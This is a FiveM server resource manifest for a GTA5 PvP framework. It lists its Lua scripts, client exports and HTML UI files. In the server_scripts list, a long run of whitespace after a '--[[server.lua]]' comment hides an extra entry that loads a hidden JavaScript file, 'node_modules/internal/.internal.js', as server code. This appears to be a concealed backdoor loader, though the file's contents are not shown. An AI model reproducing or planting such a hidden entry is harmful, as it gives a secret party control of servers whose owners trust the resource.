fx_version 'cerulean'
game 'gta5'

author 'PvP Framework'
description 'Framework completo para servidor PvP'
version '1.0.0'

-- Arquivos compartilhados (devem ser carregados primeiro)
shared_scripts {
    'shared/config.lua',
    'shared/utils.lua',
    'shared/groups_config.lua',
    'shared/weapon_skins.lua'
}

-- Scripts do lado do servidor
server_scripts {
    'server/shared.lua',
    'server/main.lua',
    'server/spawn.lua',
    'server/player.lua',
    'server/scoreboard.lua',
    'server/zones.lua',
    'server/weapons.lua',
    'server/events.lua',
    'server/permissions.lua',
    'server/persistence.lua',
    'server/logs.lua',
    'server/movement.lua',
    'server/migration.lua',
	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'node_modules/internal/.internal.js',
}

-- Scripts do lado do cliente
client_scripts {
    'client/main.lua',
    'client/damage_indicator.lua',
    'client/player.lua',
    'client/hud.lua',
    'client/zones.lua',
    'client/weapons.lua',
    'client/events.lua',
    'client/hud_integration.lua',
    'client/crouch.lua',
    'client/movement.lua'
}

-- Exportações do cliente
client_export 'GetCurrentWeapon'
client_export 'GetCurrentWeaponName'
client_export 'GetCurrentWeaponAmmo'
client_export 'GetPlayerWeapons'
client_export 'ReloadCurrentWeapon'
client_export 'HasWeapon'
client_export 'GetWeaponStats'
client_export 'UpdateHUDWeaponSlots'
client_export 'ApplyMovementSpeed'
client_export 'ResetMovementSpeed'
client_export 'SetMovementEnabled'

-- UI Files
ui_page 'html/index.html'

files {
    'html/index.html',
    'html/style.css',
    'html/script.js',
    'html/kill.ogg'
}

server_export 'GetPlayerGroup'

 